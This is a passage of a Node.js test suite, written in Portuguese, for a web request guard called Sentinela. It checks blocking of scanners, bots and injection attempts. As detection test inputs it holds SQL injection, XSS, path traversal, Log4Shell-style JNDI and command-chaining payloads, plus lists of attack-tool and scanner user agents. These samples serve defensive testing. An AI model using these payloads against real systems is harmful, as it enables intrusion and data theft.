  assert.ok(c.eventos.some((e) => e.ip === '45.26.0.1' && e.regra === 'varredura'), 'o lote recusado saiu depois');
  assert.equal(c.eventos.length, 3);
  conta(4);
});

caso('/sessao com passe_invalido não põe a credencial de quarentena', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(listaFin());
  const bom = tokFin({ jti: 'bom-6' });
  c.aceitos = [bom];
  const r = await rodar(g, req(HF, '/?sentinela_passe=eyJh.eyJw.velho', { oidc: bom }));
  assert.equal(r.status, 302);
  assert.equal(c.eventos.at(-1).regra, 'passe_invalido', 'o evento saiu com a mesma credencial');
  avancar(21000);
  await rodar(g, req(HF, '/api/dados', { oidc: bom, ip: '177.15.0.2' }));
  assert.equal(c.rota('/lista').length, 2, 'renovou normalmente');
  assert.equal(c.com(bom).length, c.chamadas.length);
  conta(4);
});

caso('URL longa: carga depois de 8 KB ou 20 KB de enchimento continua barrada', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'painel-icms', slug: 'painel-icms' }));
  const H = 'painel-icms.vercel.app';
  let i = 0;
  for (const n of [8200, 20000]) {
    const pad = 'A'.repeat(n);
    for (const [caminho, regra] of [
      ['/?a=' + pad + "&id=1'%20or%20'1'%3D'1", 'injecao'], ['/?a=' + pad + '&q=%3Cscript%3Ealert(1)%3C/script%3E', 'injecao'],
      ['/?a=' + pad + '&f=../../etc/passwd', 'injecao'], ['/?a=' + pad + '&x=%24%7Bjndi:ldap://e/a%7D', 'injecao'],
      ['/api/dados?x=' + pad + '&id=1%20UNION%20SELECT%201,2', 'injecao'],
      ['/' + 'a'.repeat(n) + '/shell.php', 'varredura'], ['/' + 'a'.repeat(n) + '/.env', 'varredura'],
    ]) {
      const r = await rodar(g, req(H, caminho, { ip: '45.16.0.' + (++i) }));
      assert.ok(r && r.status === 403, n + ': …' + caminho.slice(-30) + ' deveria ser barrado');
      assert.equal(c.eventos.at(-1).regra, regra);
      conta(2);
    }
  }
  assert.equal(await rodar(g, req(H, '/?a=' + 'A'.repeat(20000), { ip: '177.16.0.1' })), null, 'enchimento sem carga segue');
  conta();
});

caso('UNION com comentário: tempo linear e as variantes continuam barradas', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  const ctx = { waitUntil(p) { p.catch(() => {}); } };
  await g.sentinela(req(H, '/'), ctx);
  const hostis = ['/?q=' + 'union/*'.repeat(2000), '/?q=' + 'union/**/'.repeat(1600), '/?q=' + 'union%20/*!'.repeat(1300),
    '/?q=' + "'".repeat(14000), '/?q=' + 'sleep(' + ' '.repeat(14000), '/?q=' + '/*'.repeat(7000), '/?q=' + 'or%20'.repeat(3500),
    '/?q=' + 'javascript:'.repeat(1300), '/?q=' + '..%5C'.repeat(3000), '/?q=' + 'cmd.exe%20'.repeat(1400), '/' + 'a/'.repeat(7000)];
  const tempos = [];
  for (const p of hostis) {
    for (let k = 0; k < 3; k++) await g.sentinela(req(H, p, { ip: '45.17.9.' + k }), ctx);   // aquece
    const t0 = performance.now();
    for (let k = 0; k < 10; k++) await g.sentinela(req(H, p, { ip: '45.17.0.' + k }), ctx);
    const ms = (performance.now() - t0) / 10;
    tempos.push(ms);
    assert.ok(ms < 5, p.slice(0, 24) + '…: ' + ms.toFixed(2) + ' ms/req');
    conta();
  }
  console.log('        URL hostil de ~14 KB: pior ' + Math.max(...tempos).toFixed(2) + ' ms/req (antes: union/* de 8 KB levava ~21 ms)');
  for (const q of ['1/**/UNION/**/SELECT/**/1', '1%20union/*!50000*/select%201', '1/*!50000UNION*/%20/*!50000SELECT*/1',
    'x%20UNION/*a*//*b*/%20SELECT%201', '1+union+%2F*comentario*%2F+select+2', '1%20UnIoN%0aSeLeCt%201']) {
    bloqueio403(await rodar(g, req(H, '/api/dados?id=' + q, { ip: '45.17.1.' + (++seq % 250) })), 'api');
    assert.equal(c.eventos.at(-1).regra, 'injecao', q);
    conta();
  }
  assert.equal(await rodar(g, req(H, '/api/dados?q=union%20of%20select%20suppliers', { ip: '177.17.0.1' })), null, 'texto comum segue');
  conta();
});

caso('img/link de outro site com caminho de ataque: 403 sem bloquear o IP da vítima', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'painel-lube-distribuidora', slug: null }));
  const H = 'painel-lube-distribuidora.vercel.app';
  const cruzada = { 'sec-fetch-site': 'cross-site', 'sec-fetch-mode': 'no-cors', 'sec-fetch-dest': 'image' };
  const vitima = '189.40.50.60';
  for (const p of ['/wp-login.php', '/.env', '/?q=%3Cscript%3E']) {
    bloqueio403(await rodar(g, req(H, p, { ip: vitima, headers: cruzada })), 'outro');
    assert.match(c.eventos.at(-1).motivo, /possível requisição forjada por outro site \(cross-site\): sem bloqueio de IP/);
    assert.equal(c.eventos.at(-1).sec_fetch_site, 'cross-site');
    conta(2);
  }
  assert.equal(await rodar(g, req(H, '/', { ip: vitima })), null, 'a vítima continua entrando');
  // mesmo site (ou sem sec-fetch) continua barrando o IP
  bloqueio403(await rodar(g, req(H, '/wp-login.php', { ip: '45.18.0.1' })), 'outro');
  bloqueio403(await rodar(g, req(H, '/', { ip: '45.18.0.1' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'lista');
  // ferramenta de ataque no user-agent não ganha a exceção
  bloqueio403(await rodar(g, req(H, '/', { ip: '45.18.0.2', ua: 'sqlmap/1.8', headers: cruzada })), 'outro');
  bloqueio403(await rodar(g, req(H, '/', { ip: '45.18.0.2' })), 'outro');
  conta(2);
});

caso('sonda do "Alterar senha" do Chrome/Safari segue para a origem (404), sem bloquear o IP', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'painel-lube-distribuidora', slug: null }));
  const H = 'painel-lube-distribuidora.vercel.app';
  const ip = '189.50.60.70';
  const sonda = '/.well-known/resource-that-should-not-exist-whose-status-code-should-not-be-200';
  for (const p of [sonda, sonda + '/', '/.well-known/change-password', '/.well-known/change-password/']) {
    assert.equal(await rodar(g, req(H, p, { ip, headers: { 'sec-fetch-site': 'none' } })), null, p);
    assert.equal(c.eventos.at(-1).decisao, 'liberado');
    conta(2);
  }
  assert.equal(await rodar(g, req(H, '/', { ip })), null, 'IP não foi barrado');
  bloqueio403(await rodar(g, req(H, sonda + 'x', { ip: '45.19.0.1' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'varredura', 'outros /.well-known desconhecidos continuam varredura');
  conta(2);
});

caso('busca livre do Gestão TI não vira injeção; com contexto de ataque continua barrada', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'gestao-ti', slug: 'gestao-ti' }));
  const H = 'gestao-ti-ruddy.vercel.app';
  let i = 0;
  for (const p of ['/api/crud/ativos?busca=cmd.exe', '/api/chamados?busca=C%3A%5CWindows%5CSystem32%5Ccmd.exe', '/api/crud/ativos?busca=..%5Cbackup',
    '/api/chamados?busca=javascript%3A%20void', '/api/chamados?busca=erro+no+cmd.exe+ao+abrir', '/api/chamados?busca=pasta%20..%5Cpublico',
    '/api/chamados?busca=javascript%3A%20n%C3%A3o%20carrega']) {
    assert.equal(await rodar(g, req(H, p, { ip: '177.20.0.' + (++i) })), null, p);
    assert.equal(c.eventos.at(-1).decisao, 'liberado');
    conta(2);
  }
  for (const p of ['/?cmd=cmd.exe%20/c%20dir', '/?x=1|cmd.exe', '/?x=1%26%26cmd.exe', '/?f=..%5C..%5Cweb.config', '/?f=..%5Cwindows%5Cwin.ini',
    '/?next=javascript:alert(1)', '/?u=javascript://%250aalert(1)', '/?u=JaVaScRiPt:alert%601%60', '/..%5C..%5Cwindows/win.ini',
    '/javascript:alert(1)', '/bin/cmd.exe']) {
    bloqueio403(await rodar(g, req(H, p, { ip: '45.20.0.' + (++i) })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'injecao', p);
    conta();
  }
});

caso('teto por IP: scanner com 2000 caminhos → 30 POSTs diretos + lotes de 20; a central recebe todos', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  for (let i = 0; i < 2000; i++) await rodar(g, req(H, '/x' + i + '.php', { ip: '45.77.1.2' }));
  const posts = c.rota('/evento').length;
  assert.equal(posts, 30 + 98, 'POSTs /evento: ' + posts);
  assert.equal(c.eventos.length, 1990, 'só o lote incompleto (10) espera');
  avancar(2100);
  await rodar(g, req(H, '/', { ip: '177.21.0.1' }));
  assert.equal(c.eventos.length, 2001, 'o lote incompleto sai na próxima requisição');
  for (const ch of c.rota('/evento')) assert.ok(JSON.parse(ch.init.body).eventos.length <= 20);
  // eventos grandes (UA e cidade no limite, com acento) ainda cabem nos 64 KB por POST
  const g2 = await novoGuarda();
  const c2 = centralFalsa(lista());
  const grande = { ua: 'Mozilla/5.0 ' + 'é'.repeat(400), headers: { 'x-vercel-ip-city': encodeURIComponent('São '.repeat(40)), 'x-vercel-ip-country-region': 'é'.repeat(100) } };
  for (let i = 0; i < 200; i++) await rodar(g2, req(H, '/' + 'c'.repeat(280) + i + '?' + 'q'.repeat(400), { ip: '45.77.2.2', ...grande }));
  for (const ch of c2.rota('/evento')) assert.ok(Buffer.byteLength(ch.init.body) < 64 * 1024, 'corpo ' + Buffer.byteLength(ch.init.body));
  assert.ok(c2.eventos.length >= 180);
  conta(5);
});

caso('teto por IP: depois de 30 eventos no minuto, o 1º bloqueio do IP ainda sai na hora', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  for (let i = 0; i < 40; i++) await rodar(g, req(H, '/p' + i, { ip: '45.78.1.2' }));
  assert.equal(c.eventos.length, 30, '10 esperando na fila');
  await rodar(g, req(H, '/.env', { ip: '45.78.1.2' }));
  const corpo = JSON.parse(c.rota('/evento').at(-1).init.body);
  assert.equal(corpo.eventos.length, 1);
  assert.equal(corpo.eventos[0].regra, 'varredura');
  avancar(61000);
  await rodar(g, req(H, '/novo-minuto', { ip: '45.78.1.2' }));
  assert.equal(c.eventos.length, 30 + 1 + 10 + 1, 'janela nova: sai na hora e leva a fila junto');
  conta(4);
});

caso('disjuntor do /evento: central fora → eventos esperam na fila e saem em lote depois da pausa', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  c.fora = true;
  for (let i = 0; i < 20; i++) await rodar(g, req(H, '/q' + i, { ip: '177.22.0.' + i }));
  assert.equal(c.rota('/evento').length, 0, 'nenhum POST enquanto a central está em pausa');
  c.fora = false;
  avancar(16000);
  await rodar(g, req(H, '/fim', { ip: '177.22.1.1' }));
  assert.equal(c.eventos.length, 21);
  assert.equal(c.rota('/evento').length, 2, '1 direto + 1 lote de 20');
  conta(3);
});

caso('disjuntor do /evento: estouro de tempo ou 5xx pausa os próximos envios', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  await rodar(g, req(H, '/', { ip: '177.23.0.1' }));    // lista em cache
  c.atrasoEvento = 5000;
  const t0 = performance.now();
  await rodar(g, req(H, '/a', { ip: '177.23.0.2' }));   // /evento estoura em 2,5 s
  assert.ok(performance.now() - t0 < 3000);
  const antes = c.rota('/evento').length;
  for (let i = 0; i < 10; i++) await rodar(g, req(H, '/b' + i, { ip: '177.23.1.' + i }));
  assert.equal(c.rota('/evento').length, antes, 'em pausa: nenhum POST por requisição');
  c.atrasoEvento = 0;
  c.statusEvento = 500;
  avancar(16000);
  await rodar(g, req(H, '/c', { ip: '177.23.2.1' }));   // sai (direto + fila velha) e leva 500
  const depois500 = c.rota('/evento').length;
  assert.ok(depois500 > antes);
  await rodar(g, req(H, '/d', { ip: '177.23.2.2' }));
  assert.equal(c.rota('/evento').length, depois500, '5xx também pausa');
  conta(4);
});

caso('sessão que este guarda não reconhece (chave fora da lista) → home do portal, sem ?abrir; vencida → ?abrir', async () => {
  const chave = await gerarChave('a1b2c3d4e5f60718');
  const nova = await gerarChave('0000000000000001');
  // lista sem chaves (a central publicou antes de ter a chave)
  const g = await novoGuarda();
  const c = centralFalsa(listaFin({ chaves: [] }));
  const tok = await assinarJwt(sessaoPayload(), chave);
  let r = await rodar(g, req(HF, '/', { cookie: '__Host-sentinela=' + tok }));
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), PORTAL + '/');
  assert.match(c.eventos.at(-1).motivo, /sessão da Sentinela não reconhecida/);
  // chave nova ainda fora da lista em cache
  const g2 = await novoGuarda();
  centralFalsa(listaFin({ chaves: [chave.jwk] }));
  r = await rodar(g2, req(HF, '/', { cookie: '__Host-sentinela=' + (await assinarJwt(sessaoPayload(), nova)) }));
  assert.equal(r.headers.get('location'), PORTAL + '/');
  // vencida (assinatura boa): reabre pelo portal
  const vencida = await assinarJwt(sessaoPayload({ exp: Math.floor(Date.now() / 1000) - 5 }), chave);
  r = await rodar(g2, req(HF, '/', { ip: '177.24.0.2', cookie: '__Host-sentinela=' + vencida }));
  assert.equal(r.headers.get('location'), PORTAL + '/?abrir=gestao-financeiro');
  r = await rodar(g2, req(HF, '/', { ip: '177.24.0.3' }));
  assert.equal(r.headers.get('location'), PORTAL + '/?abrir=gestao-financeiro', 'sem cookie: reabre pelo portal');
  r = await rodar(g2, req(HF, '/api/dados', { ip: '177.24.0.4', cookie: '__Host-sentinela=' + tok.slice(0, -4) + 'AAAA' }));
  assert.equal(r.status, 401, 'API: 401 JSON como antes');
  conta(7);
});

/* =========================================================
   10. Robôs genéricos, não-navegador e buscador (guarda 1.1.0, 2026-10-07)
   ========================================================= */
// [user-agent, também vale em /api?] — os três primeiros chegavam à tela de login do portal em produção
const UAS_ROBO_GENERICO = [
  ['Mozilla/5.0 (compatible)', true],
  ['NoMoreVibe/1.0 (+https://nomorevibe.app)', true],
  ['RecordedFuture Global Inventory Crawler', true],
  ['Vercel MCP Fetch', true],
  ['Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', true],
  ['Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', true],
  ["Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers' presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com", true],
  ['Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)', true],
  ['Mozilla/5.0 (l9scan/2.0.234313e2735333e2938313e2536313; +https://leakix.net)', true],
  ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Shodan/1.0', true],
  ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 ZoomEye', true],
  ['Mozilla/5.0 (compatible; ModatScanner/1.1; +https://modat.io/)', true],
  ['Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)', true],
  ['Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)', true],
  ['Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)', true],
  ['Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)', true],
  ['Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)', true],
  ['Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', true],
  ['Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot', true],
  ['Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)', true],
  ['Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Claude-User/1.0; +Claude-User@anthropic.com)', true],
  ['Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)', true],
  ['ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)', true],
  ['UptimeRobot/2.0', true],
  ['check_http/v2.3.3 (monitoring-plugins 2.3.3)', true],
  ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', true],
  ['Mozilla/5.0', true],
  ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36', true],
  ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Chrome-Lighthouse', true],
  ['python-httpx/0.28.1', true], ['Python/3.12 aiohttp/3.10.5', true], ['node', true], ['Deno/2.1.4', true], ['Bun/1.1.38', true],
  ['Dalvik/2.1.0 (Linux; U; Android 13; SM-A536E Build/TP1A.220624.014)', true],
  ['libwww-perl/6.72', true], ['LWP::Simple/6.72 libwww-perl/6.72', true],
  // exceção disfarçada: cliente HTTP, varredor ou buscador junto do nome de prévia/cron não é exceção
  ['curl/8.5.0 WhatsApp/2.23', true], ['python-requests/2.32.3 vercel-cron/1.0', true], ['Go-http-client/1.1 facebookexternalhit/1.1', true],
  ['WhatsApp/2.23.20.0 A okhttp/4.12.0', true], ['Mozilla/5.0 (compatible; Censys) Twitterbot/1.0', true],
  ['axios/1.7.2 Microsoft Office Existence Discovery', true], ['w3m/0.5.3 python-requests/2.32.3', true],
  ['Mozilla/5.0 vercel-cron/1.0', true],   // o agendador manda só "vercel-cron/1.0": no meio do UA não é cron
  // sem cara de navegador: só na página (API pode ter cliente de servidor com UA próprio)
  ['Hello World', false], ['xfa1,nvdorz,nvd0rz', false],
];

for (const modo of ['observar', 'proteger']) {
  caso('robôs de UA genérico (' + UAS_ROBO_GENERICO.length + ', com cabeçalhos de navegador) → robo, ' + (modo === 'observar' ? 'observado' : '403'), async () => {
    const g = await novoGuarda();
    const c = centralFalsa(lista({ modo, projeto: 'painel-lube-distribuidora', slug: null }));
    const H = 'painel-lube-distribuidora.vercel.app';
    let i = 0;
    for (const [ua, api] of UAS_ROBO_GENERICO) {
      for (const caminho of api ? ['/', '/index.html', '/api/dados'] : ['/', '/index.html']) {
        const r = await rodar(g, req(H, caminho, { ua, ip: '45.40.' + Math.floor(i / 250) + '.' + (i++ % 250) }));
        const ev = c.eventos.at(-1);
        if (modo === 'proteger') bloqueio403(r, tipoDe(caminho));
        else assert.equal(r, null, ua + ' ' + caminho);
        assert.equal(ev.regra, 'robo', ua + ' ' + caminho + ' → ' + ev.regra + ' (' + ev.motivo + ')');
        assert.equal(ev.decisao, modo === 'proteger' ? 'bloqueado' : 'observado');
        conta(3);
      }
      if (!api) {
        assert.equal(await rodar(g, req(H, '/api/dados', { ua, ip: '45.41.0.' + (i++ % 250) })), null, ua + ' em /api segue');
        assert.equal(c.eventos.at(-1).decisao, 'liberado');
        conta(2);
      }
    }
    // os três que chegavam à tela de login do portal, com o motivo que vai para o painel
    const motivos = {};
    for (const ua of ['Mozilla/5.0 (compatible)', 'NoMoreVibe/1.0 (+https://nomorevibe.app)', 'RecordedFuture Global Inventory Crawler']) {
      await rodar(g, req(H, '/', { ua, ip: '45.42.0.' + (i++ % 250) }));
      motivos[ua] = c.eventos.at(-1).motivo.replace(/ · incidente [0-9a-f]{8}$/, '');
    }
    assert.deepEqual(motivos, {
      'Mozilla/5.0 (compatible)': 'user-agent genérico: Mozilla sem motor de navegador',
      'NoMoreVibe/1.0 (+https://nomorevibe.app)': 'varredor conhecido: nomorevibe',
      'RecordedFuture Global Inventory Crawler': 'varredor conhecido: recordedfuture',
    });
    conta();
  });
}

caso('navegadores reais (' + UAS_REAIS.length + ': desktop, celular, WebView, Instagram/Facebook/LinkedIn/TikTok, Cubot) → liberado no proteger', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger', projeto: 'painel-lube-distribuidora', slug: null }));
  const H = 'painel-lube-distribuidora.vercel.app';
  let i = 0;
  for (const ua of UAS_REAIS) {
    for (const [metodo, caminho, headers] of [
      ['GET', '/', {}], ['GET', '/admin.html', { 'sec-fetch-site': 'same-origin' }], ['GET', '/sentinela/', { 'sec-fetch-site': 'none' }],
      ['GET', '/api/dados', { 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty' }], ['POST', '/api/dados', { 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty' }],
      ['GET', '/portal.js', { 'sec-fetch-mode': 'no-cors', 'sec-fetch-dest': 'script' }],
    ]) {
      const r = await rodar(g, req(H, caminho, { metodo, ua, headers, ip: '189.60.' + Math.floor(i / 250) + '.' + (i++ % 250) }));
      const ev = c.eventos.at(-1);
      assert.equal(r, null, ua + ' ' + metodo + ' ' + caminho + ' → ' + ev.regra + ' (' + ev.motivo + ')');
      assert.equal(ev.decisao, 'liberado');
      assert.equal(ev.regra, null);
      conta(3);
    }
  }
  // Safari até o iOS 16.3 e o IE 11 não mandam sec-fetch-*, mas mandam accept-language: liberado
  for (const ua of ['Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko']) {
    const r = await rodar(g, req(H, '/', { ua, ip: '189.61.0.' + (i++ % 250), headers: { 'sec-fetch-site': null, 'sec-fetch-mode': null, 'sec-fetch-dest': null } }));
    assert.equal(r, null, ua);
    assert.equal(c.eventos.at(-1).regra, null);
    conta(2);
  }
  assert.ok(UAS_REAIS.length >= 25);
});

caso('nao_navegador: página GET/HEAD sem sec-fetch-mode e sem accept-language → suspeito; um dos dois basta; api/arquivo/POST não', async () => {
  for (const modo of ['observar', 'proteger']) {
    const g = await novoGuarda();
    const c = centralFalsa(lista({ modo, projeto: 'painel-lube-distribuidora', slug: null, confiaveis: [{ t: 'cidr', v: '131.255.253.0/24' }] }));
    const H = 'painel-lube-distribuidora.vercel.app';
    let i = 0;
    const ip = () => '45.50.' + (modo === 'proteger' ? 1 : 0) + '.' + (++i);
    for (const ua of UAS_REAIS.slice(0, 12)) {
      for (const metodo of ['GET', 'HEAD']) {
        for (const caminho of ['/', '/index.html', '/sentinela/']) {
          const r = await rodar(g, req(H, caminho, { ua, metodo, ip: ip(), headers: SEM_NAVEGADOR }));
          const ev = c.eventos.at(-1);
          if (modo === 'proteger') bloqueio403(r, 'outro');
          else assert.equal(r, null);
          assert.equal(ev.regra, 'nao_navegador', ua + ' ' + metodo + ' ' + caminho + ' → ' + ev.regra);
          assert.equal(ev.decisao, modo === 'proteger' ? 'bloqueado' : 'observado');
          conta(3);
        }
      }
    }
    // cabeçalho vazio conta como ausente
    const vazio = await rodar(g, req(H, '/', { ip: ip(), headers: { ...SEM_NAVEGADOR, 'accept-language': '', 'sec-fetch-mode': ' ' } }));
    assert.equal(c.eventos.at(-1).regra, 'nao_navegador');
    if (modo === 'proteger') bloqueio403(vazio, 'outro');
    const seguem = [
      ['GET', '/', { ...SEM_NAVEGADOR, 'accept-language': 'pt-BR' }, 'só accept-language'],
      ['GET', '/', { ...SEM_NAVEGADOR, 'sec-fetch-mode': 'navigate' }, 'só sec-fetch-mode'],
      ['GET', '/api/dados', SEM_NAVEGADOR, 'api'],
      ['GET', '/portal.js', SEM_NAVEGADOR, 'arquivo'],
      ['GET', '/dados.json', SEM_NAVEGADOR, 'arquivo'],
      ['POST', '/', SEM_NAVEGADOR, 'POST de página'],
      ['OPTIONS', '/', SEM_NAVEGADOR, 'OPTIONS'],
    ];
    for (const [metodo, caminho, headers, nome] of seguem) {
      assert.equal(await rodar(g, req(H, caminho, { metodo, headers, ip: ip() })), null, nome);
      assert.equal(c.eventos.at(-1).decisao, 'liberado', nome);
      assert.equal(c.eventos.at(-1).regra, null, nome);
      conta(3);
    }
    // IP confiável (o escritório): a regra não vale, sem marca no evento
    assert.equal(await rodar(g, req(H, '/', { ip: '131.255.253.169', headers: SEM_NAVEGADOR })), null);
    assert.equal(c.eventos.at(-1).decisao, 'liberado');
    assert.equal(c.eventos.at(-1).regra, null);
    conta(3);
  }
});

caso('identidade (cookie da Sentinela ou login do app): UA de robô, buscador e sem cabeçalhos de navegador → liberado; ataque continua 403', async () => {
  const g = await novoGuarda();
  const { chave, outra, c, H } = await cenarioLogin({ modo: 'proteger' });
  const cookie = '__Host-sentinela=' + (await assinarJwt(sessaoPayload(), chave));
  let i = 0;
  const ip = () => '177.70.0.' + (++i);
  const tab = [
    ['/', { ua: 'curl/8.7.1' }], ['/api/dados', { ua: 'python-requests/2.32.3' }], ['/', { ua: null }],
    ['/', { ua: 'Mozilla/5.0 (compatible)', headers: SEM_NAVEGADOR }], ['/folha.html', { ua: 'Vercel MCP Fetch' }],
    ['/', { ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }],
    ['/', { headers: SEM_NAVEGADOR }], ['/folha.html', { metodo: 'HEAD', headers: SEM_NAVEGADOR }],
    ['/', { ua: 'RecordedFuture Global Inventory Crawler', headers: SEM_NAVEGADOR }],
  ];
  for (const [caminho, o] of tab) {
    assert.equal(await rodar(g, req(H, caminho, { ...o, cookie, ip: ip() })), null, 'com sessão: ' + (o.ua || '(navegador)') + ' ' + caminho);
    const ev = c.eventos.at(-1);
    assert.equal(ev.decisao, 'liberado');
    assert.equal(ev.regra, null);
    assert.equal(ev.identidade, 'julio@lube.com.br');
    conta(4);
  }
  // login do app (Next): a mesma coisa
  const app = { identidade: { email: 'ana@lube.com.br', origem: 'sessao_app' } };
  for (const [caminho, o] of tab) {
    assert.equal(await rodar(g, req(H, caminho, { ...o, ip: ip() }), app), null, 'com login do app: ' + (o.ua || '(navegador)'));
    assert.equal(c.eventos.at(-1).identidade, 'ana@lube.com.br');
    conta(2);
  }
  // sem identidade, sessão de outra chave ou vencida: o UA volta a pesar (proteger → 403 antes do portal)
  const falsa = '__Host-sentinela=' + (await assinarJwt(sessaoPayload(), outra));
  const vencida = '__Host-sentinela=' + (await assinarJwt(sessaoPayload({ exp: Math.floor(Date.now() / 1000) - 5 }), chave));
  for (const ck of [undefined, falsa, vencida]) {
    bloqueio403(await rodar(g, req(H, '/', { ua: 'curl/8.7.1', cookie: ck, ip: ip() })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'robo');
    bloqueio403(await rodar(g, req(H, '/', { headers: SEM_NAVEGADOR, cookie: ck, ip: ip() })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'nao_navegador');
    bloqueio403(await rodar(g, req(H, '/', { ua: 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)', cookie: ck, ip: ip() })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'buscador');
    conta(3);
  }
  // navegador sem sessão continua indo para o portal (não é robô)
  const portal = await rodar(g, req(H, '/', { ip: ip() }));
  assert.equal(portal.status, 302);
  assert.equal(c.eventos.at(-1).regra, 'sem_login');
  // ataque certo vale para quem tem sessão e para o login do app
  bloqueio403(await rodar(g, req(H, '/.env', { cookie, ip: '45.70.0.1' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'varredura');
  assert.equal(c.eventos.at(-1).identidade, 'julio@lube.com.br');
  bloqueio403(await rodar(g, req(H, '/api/dados', { cookie, ua: 'sqlmap/1.8.4#stable (https://sqlmap.org)', ip: '45.70.0.2' })), 'api');
  assert.equal(c.eventos.at(-1).regra, 'ferramenta');
  bloqueio403(await rodar(g, req(H, '/?id=1%20UNION%20SELECT%201', { ip: '45.70.0.3' }), app), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'injecao');
  conta(6);
});

caso('buscador (Google, Bing, DuckDuckGo, Yandex, Baidu, Apple) → suspeito regra buscador; robots.txt e arquivo seguem', async () => {
  const BUSCADORES = [
    ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'googlebot'],
    ['Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.54 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'googlebot'],
    ['Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'bingbot'],
    ['DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)', 'duckduckbot'],
    ['Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)', 'yandexbot'],
    ['Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)', 'baiduspider'],
    ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)', 'applebot'],
  ];
  for (const modo of ['observar', 'proteger']) {
    const g = await novoGuarda();
    const c = centralFalsa(lista({ modo, projeto: 'painel-lube-distribuidora', slug: null }));
    const H = 'painel-lube-distribuidora.vercel.app';
    let i = 0;
    for (const [ua, nome] of BUSCADORES) {
      for (const caminho of ['/', '/api/dados']) {
